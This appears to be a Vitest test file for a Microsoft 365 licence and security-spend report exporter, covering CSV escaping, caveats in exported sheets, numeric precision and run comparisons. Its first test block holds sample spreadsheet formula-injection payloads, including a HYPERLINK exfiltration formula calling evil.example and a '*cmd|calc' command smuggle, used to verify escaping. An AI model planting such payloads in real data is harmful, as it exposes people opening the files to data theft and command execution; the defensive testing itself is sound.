/**
 * Getting the analysis out without losing what qualifies it.
 *
 * Two things are guarded here. That a spreadsheet cannot be turned into an attack by a
 * tenant display name, and that a figure carrying a caveat on screen still carries it in
 * the file, because the file is the copy that gets forwarded.
 */
import { describe, expect, it } from 'vitest';

import premiumSnapshot from '@fixtures/premium-snapshot.json';
import e7Snapshot from '@fixtures/e7-snapshot.json';
import unpricedSnapshot from '@fixtures/unpriced-snapshot.json';
import baselineSnapshot from '@fixtures/premium-baseline-snapshot.json';

import { analyze, clearOverrides, setOverride, type Overrides } from './index';
import { compareSnapshots, type RunComparison } from './compare';
import { escapeCsvField, toCsv } from './csv';
import { cents, exportManifest, exportSections, toJsonExport } from './export';
import { catalog, cloneConfig, featureMap, listPriceList, riskModel } from '@/data/reference';
import { parseSnapshot } from '@/model/snapshot';

const model = (() => {
  const parsed = parseSnapshot(premiumSnapshot);
  if (!parsed.ok) throw new Error(parsed.reason);
  return analyze({
    snapshot: parsed.snapshot,
    config: cloneConfig(),
    catalog,
    priceList: listPriceList,
    featureMap,
    riskModel,
  });
})();

describe('a spreadsheet cannot be turned into an attack', () => {
  it('neutralises every character a spreadsheet reads as a formula', () => {
    // A tenant is exactly where an attacker can set a display name, and these files are
    // opened in Excel on the consultant's own machine.
    for (const payload of ['=1+1', '+1', '-1', '@SUM(A1)', '\tcmd', '\rcmd']) {
      expect(escapeCsvField(payload).startsWith("'")).toBe(true);
    }
  });

  it('neutralises the classic exfiltration payload', () => {
    const attack = '=HYPERLINK("http://evil.example/?d="&A1,"click")';
    const out = escapeCsvField(attack);
    expect(out.startsWith('"\'=')).toBe(true);
  });

  it('prefixes rather than strips, so a legitimate value survives', () => {
    // "-5" is a real number a reader needs to see, and a rule genuinely named "=SUM" must
    // still be identifiable. The apostrophe marks it as text without altering it.
    expect(escapeCsvField('-5')).toBe("'-5");
    expect(escapeCsvField('=SUM report')).toBe("'=SUM report");
  });

  it('carries the guard through the whole pipeline, not just the escaper', () => {
    // The unit tests above prove escapeCsvField works. This proves it is actually reached:
    // a display name set by an attacker in the tenant travels through collection, analysis
    // and the account breakdown, and still arrives as text.
    const parsed = parseSnapshot(premiumSnapshot);
    if (!parsed.ok) throw new Error(parsed.reason);
    const hostile = structuredClone(parsed.snapshot);
    for (const user of hostile.Collectors.users!.Data!) {
      user.DisplayName = '=HYPERLINK("http://evil.example/?d="&A1,"payroll")';
      user.UserPrincipalName = '@SUM(1+1)*cmd|calc';
    }

    const attacked = analyze({
      snapshot: hostile,
      config: cloneConfig(),
      catalog,
      priceList: listPriceList,
      featureMap,
      riskModel,
    });

    const accounts = exportSections(attacked).find((s) => s.id === 'wasted-spend-accounts');
    expect(accounts, 'the fixture must produce account rows for this to test anything').toBeTruthy();
    const rows = accounts!.csv().trim().split('\n').slice(1);
    expect(rows.length).toBeGreaterThan(0);

    for (const row of rows) {
      expect(row).toContain('evil.example');
      // No cell may begin with a character a spreadsheet evaluates. A quoted cell is
      // checked past its opening quote, which is where the payload would sit.
      for (const cell of row.split(',')) {
        expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@\t\r]/);
      }
    }
  });

  it('leaves ordinary text alone', () => {
    expect(escapeCsvField('Microsoft 365 E5')).toBe('Microsoft 365 E5');
    expect(escapeCsvField(42)).toBe('42');
    // A number the tool computed is never a formula, so a negative one stays a number.
    // The same characters as text, which could have come from a tenant, are neutralised.
    expect(escapeCsvField(-8)).toBe('-8');
    expect(escapeCsvField(-5760.5)).toBe('-5760.5');
    expect(escapeCsvField('-8')).toBe("'-8");
    expect(escapeCsvField(null)).toBe('');
  });

  it('quotes and escapes commas, quotes and newlines', () => {
    expect(escapeCsvField('a,b')).toBe('"a,b"');
    expect(escapeCsvField('say "hi"')).toBe('"say ""hi"""');
    // Newlines are flattened: remediation text is full of them and a row that spans
    // lines is unreadable in every tool that is not a spreadsheet.
    expect(escapeCsvField('one\ntwo')).toBe('one two');
  });

  it('produces a header and one line per row', () => {
    const csv = toCsv([{ a: 1 }, { a: 2 }], [{ header: 'A', value: (r) => r.a }]);
    expect(csv).toBe('A\n1\n2\n');
  });
});

describe('the export carries its own caveats', () => {
  const sections = exportSections(model);

  it('offers a sheet per audience question', () => {
    const ids = sections.map((s) => s.id);
    expect(ids).toContain('licence-inventory');
    expect(ids).toContain('entitled-versus-deployed');
    expect(ids).toContain('licence-rollup');
    expect(ids).toContain('wasted-spend');
    expect(ids).toContain('roadmap');
  });

  it('warns in the sheet itself that the per-control column is not additive', () => {
    const controls = sections.find((s) => s.id === 'entitled-versus-deployed')!;
    expect(controls.description).toMatch(/NOT additive/i);
  });

  it('dates a control a packaging change added, and leaves the rest blank', () => {
    // An E3-only tenant after July 2026: Defender for Office 365 Plan 1 arrived in E3.
    const s = structuredClone(premiumSnapshot) as any;
    const skus = s.Collectors.subscribedSkus.Data as any[];
    skus
      .find((k) => k.SkuPartNumber === 'SPE_E3')
      .ServicePlans.push({ ServicePlanId: 'f20fedf3-f3c3-43c3-8267-2bfdd51c0939', ServicePlanName: 'ATP_ENTERPRISE', ProvisioningStatus: 'Success', AppliesTo: 'User' });
    s.Collectors.subscribedSkus.Data = skus.filter((k) => !['SPE_E5', 'ATP_ENTERPRISE'].includes(k.SkuPartNumber));
    const parsed = parseSnapshot(s);
    if (!parsed.ok) throw new Error(parsed.reason);
    const e3 = analyze({ snapshot: parsed.snapshot, config: cloneConfig(), catalog, priceList: listPriceList, featureMap, riskModel });

    const sheet = (m: typeof model) => {
      const lines = exportSections(m).find((x) => x.id === 'entitled-versus-deployed')!.csv().trim().split('\n');
      const header = lines[0]!.split(',');
      const at = (control: string, column: string) =>
        lines.find((l) => l.split(',')[1] === control)!.split(',')[header.indexOf(column)];
      return at;
    };
    expect(sheet(e3)('MDO_SafeLinksForOfficeApps', 'Newly entitled since')).toBe('2026-07-01');
    expect(sheet(e3)('MDO_SafeLinksForOfficeApps', 'Newly entitled through')).toBe('Microsoft 365 E3');
    expect(sheet(e3)('AdminMFAV2', 'Newly entitled since')).toBe('');
    // The sample tenant already paid for these through E5 and standalone Defender.
    expect(sheet(model)('MDO_SafeLinksForOfficeApps', 'Newly entitled since')).toBe('');
  });

  it('labels the risk inputs as assumptions in the column headers', () => {
    // This sheet will be forwarded without the report around it, so the caveat has to
    // survive inside the file rather than beside it.
    const threats = sections.find((s) => s.id === 'threat-exposure');
    expect(threats).toBeTruthy();
    const header = threats!.csv().split('\n')[0]!;
    expect(header).toMatch(/assumption/i);
  });

  it('carries the security budget in the licence sheet, labelled as an allocation', () => {
    // It was in the PowerShell CSV and the app's JSON, but not the app's CSV, which is the
    // export most people take. A finance column only works if finance receives it.
    const lines = sections.find((s) => s.id === 'licence-inventory')!.csv().trim().split('\n');
    const header = lines[0]!.split(',');
    const iBudget = header.findIndex((h) => /security budget/i.test(h));
    const iPart = header.indexOf('Part number');
    expect(iBudget, 'licence-inventory.csv should carry the security budget').toBeGreaterThan(-1);
    expect(header[iBudget]).toMatch(/allocation/i);

    const byPart = new Map(lines.slice(1).map((l) => l.split(',')).map((c) => [c[iPart], c[iBudget]]));
    // The same hand-derived figures the parity tests pin.
    expect(byPart.get('SPE_E3')).toBe('21565.44');
    expect(byPart.get('SPE_E5')).toBe('27648');
    // Priced, and nobody assigned: a real zero.
    expect(byPart.get('ATP_ENTERPRISE')).toBe('0');
    // Unpriced: unknown, so empty, never zero.
    expect(byPart.get('CONTOSO_CUSTOM_ADDON')).toBe('');
  });

  it('writes money to the cent rather than as binary noise', () => {
    // Proves the noise is real before proving it is removed.
    expect(String(0.07 * 168)).toBe('11.760000000000002');
    expect(cents(0.07 * 168)).toBe(11.76);
    expect(cents(21565.44)).toBe(21565.44);
    expect(cents(0)).toBe(0);
    expect(cents(null)).toBe('');
  });

  it('writes a README naming what is measured, supplied and assumed', () => {
    const readme = exportManifest(model, 'sample tenant', sections);
    expect(readme).toMatch(/WHAT IS MEASURED AND WHAT IS ASSUMED/);
    expect(readme).toMatch(/Microsoft Graph does not expose contract pricing/);
    expect(readme).toMatch(/NOT additive/);
    expect(readme).toMatch(/An empty cell means the figure could not be established/);
    expect(readme).toMatch(/security budget[\s\S]*allocation model/i);
    for (const s of sections) expect(readme).toContain(`${s.id}.csv`);
  });

  it('says how much of the tenant the risk figure actually rests on', () => {
    // On a production tenant only 43 of 209 controls carried a threat tag. A board pack
    // quoting expected loss without that proportion is quoting a fifth of the tenant.
    const readme = exportManifest(model, 'x', sections);
    if (model.risk.controlsWithoutThreatTag > 0) {
      expect(readme).toMatch(/Risk rests on \d+ of \d+ scored controls/);
    }
  });

  it('keeps an unavailable figure empty rather than zero', () => {
    // Parsed by column rather than by substring: "no" also appears in the cost-is-a-floor
    // column, so a filter matching it tested nothing at all.
    const lines = sections
      .find((s) => s.id === 'wasted-spend')!
      .csv()
      .trim()
      .split('\n');
    const header = lines[0]!.split(',');
    const iMeasured = header.indexOf('Measured');
    const iSeats = header.indexOf('Seats');
    const iCost = header.indexOf('Annual cost');
    const iWhy = header.indexOf('Why not measured');

    const unmeasured = lines
      .slice(1)
      .map((l) => l.split(','))
      .filter((cells) => cells[iMeasured] === 'no');

    expect(unmeasured.length).toBeGreaterThan(0);
    for (const cells of unmeasured) {
      expect(cells[iSeats]).toBe('');
      expect(cells[iCost]).toBe('');
      // And it says why, so an empty cell is never mistaken for an oversight.
      expect(cells.slice(iWhy).join(',').length).toBeGreaterThan(0);
    }
  });
});

describe('the JSON export', () => {
  it('leads with what the reader must know before quoting a figure', () => {
    const json = toJsonExport(model, 'sample tenant') as Record<string, any>;
    expect(json.kind).toBe('m365-security-investment-report');
    expect(json.$readThisFirst.pricing).toMatch(/does not expose contract pricing/);
    expect(json.$readThisFirst.riskModel).toMatch(/assumptions/i);
    expect(json.$readThisFirst.notMeasured).toMatch(/rather than as zero/);
  });

  it('carries the whole model, so nothing needs re-collecting to answer a question', () => {
    const json = toJsonExport(model, 'x') as Record<string, any>;
    for (const key of ['tenant', 'inventory', 'spend', 'seatWaste', 'features', 'risk', 'roadmap', 'realization']) {
      expect(json[key], key).toBeTruthy();
    }
    expect(json.source.collectors.length).toBeGreaterThan(0);
  });

  it('survives a round trip through JSON', () => {
    const json = toJsonExport(model, 'x');
    expect(() => JSON.parse(JSON.stringify(json))).not.toThrow();
  });
});

describe('every figure in every sheet is written to a readable precision', () => {
  // The threat and roadmap sheets wrote figures like 94829.26829268293, and expected loss
  // came out as 42000.00000000001. Every other money column was clean only because every
  // shipped test price is a whole number of dollars; a real price such as 8.55 breaks them,
  // since 8.55 x 12 is 102.60000000000001 in binary.
  //
  // Each numeric column is classified, and a numeric column nobody has classified fails the
  // test, so a new column has to decide its precision rather than inherit noise.
  const PLACES: Record<string, number> = {
    // Money, to the cent.
    'Unit price monthly': 2,
    'Annual commitment': 2,
    'Annual spend in use': 2,
    'Idle seat cost': 2,
    'Annual security budget (allocation)': 2,
    'Annual cost of that licence': 2,
    'Annual cost': 2,
    'At risk': 2,
    'Impact USD (assumption)': 2,
    'Expected loss': 2,
    Avoided: 2,
    Retained: 2,
    'Risk retired (assumption-based)': 2,
    'Spend unlocked': 2,
    // Secure Score points, which Microsoft issues in fractions such as 4.5.
    Score: 2,
    'Max score': 2,
    'Points earned': 2,
    'Points available': 2,
    'Secure Score points': 2,
    // Ratios.
    'Annual likelihood (assumption)': 4,
    Coverage: 4,
    // Counts.
    'Purchased seats': 0,
    'Assigned seats': 0,
    'Unassigned seats': 0,
    Seats: 0,
    Controls: 0,
    'Controls it enables': 0,
    Deployed: 0,
    Order: 0,
    // The comparison sheets.
    'Score then': 2,
    'Score now': 2,
    'Points change': 2,
    'Seats bought then': 0,
    'Seats bought now': 0,
    'Seats assigned then': 0,
    'Seats assigned now': 0,
    'Annual commitment then': 2,
    'Annual commitment now': 2,
    'Annual commitment change': 2,
  };

  /** RFC 4180, because product names and remediation text contain commas. */
  const parseCsv = (text: string): string[][] => {
    const rows: string[][] = [];
    let row: string[] = [];
    let cell = '';
    let quoted = false;
    const body = text.replace(/^\uFEFF/, '');
    for (let i = 0; i < body.length; i++) {
      const ch = body[i]!;
      if (quoted) {
        if (ch === '"' && body[i + 1] === '"') { cell += '"'; i++; }
        else if (ch === '"') quoted = false;
        else cell += ch;
      } else if (ch === '"') quoted = true;
      else if (ch === ',') { row.push(cell); cell = ''; }
      else if (ch === '\n' || ch === '\r') {
        if (ch === '\r' && body[i + 1] === '\n') i++;
        row.push(cell); rows.push(row); row = []; cell = '';
      } else cell += ch;
    }
    if (cell !== '' || row.length) { row.push(cell); rows.push(row); }
    return rows;
  };

  const run = (raw: unknown, overrides?: Overrides) => {
    const parsed = parseSnapshot(raw);
    if (!parsed.ok) throw new Error(parsed.reason);
    return analyze({ snapshot: parsed.snapshot, config: cloneConfig(), catalog, priceList: listPriceList, featureMap, riskModel, overrides });
  };

  // Microsoft Teams Enterprise really is listed at 8.55.
  const stressed = run(premiumSnapshot, setOverride(clearOverrides(), 'SPE_E3', 8.55));

  // The comparison sheets too, compared at the stressed price so their money columns meet
  // the same noise.
  const compared = (overrides?: Overrides): RunComparison => {
    const snap = (raw: unknown) => {
      const p = parseSnapshot(raw);
      if (!p.ok) throw new Error(p.reason);
      return p.snapshot;
    };
    const r = compareSnapshots({
      config: cloneConfig(), catalog, priceList: listPriceList, featureMap, riskModel, overrides,
      baseline: snap(baselineSnapshot), current: snap(premiumSnapshot),
    });
    if (!r.ok) throw new Error(r.reason);
    return r.comparison;
  };

  const models: ReadonlyArray<readonly [string, ReturnType<typeof run>, RunComparison | null]> = [
    ['the sample tenant', model, null],
    ['the sample tenant with E3 at USD 8.55', stressed, null],
    ['the E7 tenant', run(e7Snapshot), null],
    ['the unpriced tenant', run(unpricedSnapshot), null],
    ['the sample tenant compared with June', model, compared()],
    ['the sample tenant compared with June, E3 at USD 8.55', stressed, compared(setOverride(clearOverrides(), 'SPE_E3', 8.55))],
  ];

  it('starts from a model that genuinely carries binary noise', () => {
    // Otherwise the test below could pass by never meeting the problem.
    const e3 = stressed.inventory.find((r) => r.skuPartNumber === 'SPE_E3')!;
    expect(String(e3.annualCommitment)).toMatch(/\.\d{3,}$/);
  });

  it('writes no numeric cell beyond the precision its column is allowed', () => {
    const problems: string[] = [];
    for (const [name, m, comparison] of models) {
      for (const section of exportSections(m, comparison)) {
        const [header, ...rows] = parseCsv(section.csv());
        for (const cells of rows) {
          cells.forEach((cell, i) => {
            if (!/^-?\d+(\.\d+)?$/.test(cell)) return;
            const column = header![i]!;
            const allowed = PLACES[column];
            if (allowed === undefined) {
              problems.push(`${section.id} "${column}" holds numbers but has no precision decided`);
              return;
            }
            const places = (cell.split('.')[1] ?? '').length;
            if (places > allowed) problems.push(`${name}: ${section.id} "${column}" wrote ${cell}`);
          });
        }
      }
    }
    expect([...new Set(problems)]).toEqual([]);
  });

  it('says in the README that the sheets are rounded and the arithmetic is not', () => {
    const readme = exportManifest(model, 'x', exportSections(model));
    expect(readme).toMatch(/to the cent/i);
    expect(readme).toMatch(/points earned divided by points available/i);
  });
});

describe('a comparison travels with the export, and only when there is one', () => {
  const comparison = (() => {
    const snap = (raw: unknown) => {
      const p = parseSnapshot(raw);
      if (!p.ok) throw new Error(p.reason);
      return p.snapshot;
    };
    const r = compareSnapshots({
      config: cloneConfig(), catalog, priceList: listPriceList, featureMap, riskModel,
      baseline: snap(baselineSnapshot), current: snap(premiumSnapshot),
    });
    if (!r.ok) throw new Error(r.reason);
    return r.comparison;
  })();

  it('adds the 2 "changed" sheets while comparing', () => {
    const ids = (c: RunComparison | null) => exportSections(model, c).map((s) => s.id);
    expect(ids(null)).not.toContain('controls-changed');
    expect(ids(comparison)).toEqual(expect.arrayContaining(['controls-changed', 'licences-changed']));
    const controls = exportSections(model, comparison).find((s) => s.id === 'controls-changed')!;
    expect(controls.rowCount).toBe(8);
    // Regressions first, as on screen.
    expect(controls.csv().split('\n')[1]).toMatch(/^Configure anti-phishing|AntiPhishPolicy/);
  });

  it('puts the comparison in the JSON, with a note on how it was made', () => {
    const without = toJsonExport(model, 'x') as Record<string, any>;
    const withIt = toJsonExport(model, 'x', comparison) as Record<string, any>;
    expect('comparison' in without).toBe(false);
    expect('comparison' in without.$readThisFirst).toBe(false);
    expect(withIt.comparison.daysBetween).toBe(92);
    expect(withIt.$readThisFirst.comparison).toMatch(/same prices/);
  });

  it('says in the README which run it compared with, and how', () => {
    const readme = exportManifest(model, 'x', exportSections(model, comparison), comparison);
    expect(readme).toMatch(/Compared:\s+with the run collected 2026-06-03/);
    expect(readme).toMatch(/COMPARED WITH AN EARLIER RUN/);
    expect(readme).toMatch(/priced with\s+the same prices/);
    expect(exportManifest(model, 'x', exportSections(model))).not.toMatch(/COMPARED WITH/);
  });
});

describe('a negative change is written as a number a spreadsheet can sum', () => {
  // Found by downloading the controls sheet from the running app: anti-phishing's -8 came
  // out as '-8, which Excel reads as text. Nothing summed or sorted on that column.
  const comparison = (() => {
    const snap = (raw: unknown) => {
      const p = parseSnapshot(raw);
      if (!p.ok) throw new Error(p.reason);
      return p.snapshot;
    };
    const r = compareSnapshots({
      config: cloneConfig(), catalog, priceList: listPriceList, featureMap, riskModel,
      baseline: snap(baselineSnapshot), current: snap(premiumSnapshot),
    });
    if (!r.ok) throw new Error(r.reason);
    return r.comparison;
  })();

  const cell = (id: string, key: string, column: string) => {
    const lines = exportSections(model, comparison).find((s) => s.id === id)!.csv().trim().split('\n');
    const header = lines[0]!.split(',');
    const row = lines.find((l) => l.includes(key))!.split(',');
    return row[header.indexOf(column)];
  };

  it('writes a fall in Secure Score points as a number', () => {
    expect(cell('controls-changed', 'AntiPhishPolicy', 'Points change')).toBe('-8');
  });

  it('writes a fall in commitment as a number', () => {
    expect(cell('licences-changed', ',EMS,', 'Annual commitment change')).toBe('-5760');
  });
});
